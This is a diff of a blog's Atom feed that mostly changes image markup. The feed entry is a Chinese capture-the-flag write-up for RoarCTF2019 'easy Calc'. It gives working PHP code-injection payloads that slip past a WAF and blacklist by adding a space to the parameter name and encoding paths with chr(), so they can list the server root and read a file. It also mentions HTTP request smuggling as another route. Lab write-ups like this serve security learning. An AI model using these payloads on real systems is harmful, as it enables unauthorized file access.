@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-05-29T06:12:15.489Z</updated>
+  <updated>2020-05-29T06:16:47.901Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://lingxin16.github.io/2020/05/29/roarctf2019-easy%20Calc/"/>
     <id>http://lingxin16.github.io/2020/05/29/roarctf2019-easy%20Calc/</id>
     <published>2020-05-29T04:57:33.000Z</published>
-    <updated>2020-05-29T06:12:15.489Z</updated>
+    <updated>2020-05-29T06:16:47.901Z</updated>
     
-    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目是这样子的</p><p>![QQ截图20200529130023](/roarctf2019-easy Calc/QQ截图20200529130023.jpg)</p><p>类似一个计算器</p><p>在源代码中我们看到他增加了一个waf 还发现了calc.php</p><p>![QQ截图20200529130218](/roarctf2019-easy Calc/QQ截图20200529130218.jpg)</p><p>打开calc.php可以看到他设置了黑名单</p><p>![QQ截图20200529130500](/roarctf2019-easy Calc/QQ截图20200529130500.jpg)</p><p>那么我们就是要想法绕过</p><p>这里我们是选择用PHP的字符串解析来bypass</p><p>构造payload:</p><p>查看目录:calc.php?%20num=var_dump(scandir(chr(47)))</p><p>![1](/roarctf2019-easy Calc/1.png)</p><p>这里我们发现一个文件f1agg</p><p>读取f1agg:calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><p>得到flag</p><p>这里我们用HTTP走私漏洞同样也可以解这道题</p><p>参考<a href="https://www.plasf.cn/2019/10/16/2019-10-16-HTTP%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-RoarCTF2019-easycalc/" target="_blank" rel="noopener">HTTP走私漏洞</a></p><p>![2](/roarctf2019-easy Calc/2.png)![3](/roarctf2019-easy Calc/3.png)</p>]]></content>
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目是这样子的</p><p><img src="/2020/05/29/roarctf2019-easy%20Calc/QQ%E6%88%AA%E5%9B%BE20200529130023.jpg" alt="QQ截图20200529130023"></p><p>类似一个计算器</p><p>在源代码中我们看到他增加了一个waf 还发现了calc.php</p><p>![QQ截图20200529130218](/roarctf2019-easy Calc/QQ截图20200529130218.jpg)</p><p>打开calc.php可以看到他设置了黑名单</p><p><img src="/2020/05/29/roarctf2019-easy%20Calc/QQ%E6%88%AA%E5%9B%BE20200529130500.jpg" alt="QQ截图20200529130500"></p><p>那么我们就是要想法绕过</p><p>这里我们是选择用PHP的字符串解析来bypass</p><p>构造payload:</p><p>查看目录:calc.php?%20num=var_dump(scandir(chr(47)))</p><p>![1](/roarctf2019-easy Calc/1.png)</p><p>这里我们发现一个文件f1agg</p><p>读取f1agg:calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p><p>得到flag</p><p>这里我们用HTTP走私漏洞同样也可以解这道题</p><p>参考<a href="https://www.plasf.cn/2019/10/16/2019-10-16-HTTP%E8%B5%B0%E7%A7%81%E6%BC%8F%E6%B4%9E-RoarCTF2019-easycalc/" target="_blank" rel="noopener">HTTP走私漏洞</a></p><p><img src="/2020/05/29/roarctf2019-easy%20Calc/2.png" alt="2"></p><p><img src="/2020/05/29/roarctf2019-easy%20Calc/3.png" alt="3"></p>]]></content>
     
     <summary type="html">
     
